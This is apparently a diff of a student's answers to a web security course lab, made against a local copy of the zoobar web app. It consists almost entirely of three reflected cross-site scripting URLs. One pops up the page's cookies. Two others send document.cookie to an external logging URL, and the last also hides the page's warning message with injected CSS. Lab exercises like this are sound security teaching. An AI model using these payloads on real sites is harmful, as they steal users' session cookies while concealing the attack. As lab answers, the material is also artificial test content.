@@ -1,1 +1,13 @@
 ## Place your answers here.
+
+- Exercise 3
+
+http://localhost:8080/zoobar/index.cgi/users?user=" size=10><script>alert(document.cookie)</script><span "
+
+- Exercise 4
+
+http://localhost:8080/zoobar/index.cgi/users?user=" size=10><script>(new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=rudeigerc' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random();</script><span "
+
+- Exercise 5
+
+http://localhost:8080/zoobar/index.cgi/users?user=" size=10><script>(new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=rudeigerc' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random();</script><style>.warning{display: none; visibility: hidden; height: 0; width: 0;}</style><span "
